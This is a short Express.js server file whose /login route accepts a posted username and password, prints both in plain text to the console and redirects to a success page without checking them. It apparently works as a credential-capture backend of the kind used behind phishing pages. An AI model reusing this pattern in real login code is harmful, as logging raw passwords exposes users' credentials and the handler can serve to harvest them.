const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Handle form submission
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  console.log("Received login credentials:");
  console.log("Username:", username);
  console.log("Password:", password);

  // Redirect to success page
  res.redirect("/success.html");
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
